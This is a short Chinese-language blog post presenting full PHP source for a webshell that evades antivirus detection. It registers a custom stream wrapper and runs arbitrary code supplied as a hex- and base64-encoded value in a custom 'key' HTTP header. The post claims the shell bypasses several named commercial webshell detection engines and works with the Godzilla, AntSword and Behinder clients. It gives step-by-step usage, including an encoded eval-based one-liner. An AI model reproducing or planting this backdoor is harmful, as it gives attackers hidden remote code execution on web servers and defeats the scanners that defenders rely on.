---
title: php流包装免杀webshell
date: 2024-07-23 11:43:16
---

## webshell免杀（php）

理论支持通杀所有PHP版本。

支持哥斯拉、蚁剑、冰蝎。

绕过长亭百川云Webshell引擎、河马webshell查杀引擎、D盾查杀。

使用方法：

添加自定义头：key=xxx

其中xxx是上述马子的base64编码再hex编码。

例如：

`<?php @eval($_POST['cmd']);?>`

经base64编码以及hex编码后：

`5044397761484167514756325957776f4a46395154314e555779646a6257516e58536b37507a343d`

连接时添加自定义头：

`key: 5044397761484167514756325957776f4a46395154314e555779646a6257516e58536b37507a343d`

```

<?php  
​  
# base64->hex  
# 把需要连接的webshell进行base64编码再hex编码，然后连接时，自定义请求头加上key: xxx(编码后的webshell)  
      
$header = "key";  
​  
function app() {  
    include 'app://config.yaml';  
}  
​  
function hex2str($hex_str) {  
    if (strlen($hex_str) % 2 != 0) {  
        echo "error";  
        return false;  
    }  
    $str = '';  
    for ($i = 0; $i < strlen($hex_str); $i += 2) {  
        $str .= chr(hexdec($hex_str[$i] . $hex_str[$i+1]));  
    }  
    return $str;  
}  
​  
class Stream {  
    private $position;  
    private $code;  
​  
    public function stream_open($path, $mode, $options, &$opened_path) {  
        $url = parse_url($path);  
        $this->code = $GLOBALS[$url["host"]];  
        $this->position = 0;  
        return true;  
    }  
​  
    public function stream_read($count) {  
        $result = substr($this->code, $this->position, $count);  
        $this->position += strlen($result);  
        return $result;  
    }  
​  
    public function stream_eof() {  
        return $this->position >= strlen($this->code);  
    }  
​  
    public function stream_stat() {  
        return "";  
    }  
}  
​  
​  
stream_wrapper_register("app", "Stream") or die("error!");  
$stream = @base64_decode(hex2str($_SERVER["HTTP_".strtoupper($header)]));  
$GLOBALS['config.yaml'] = $stream;  
​  
@app();
```
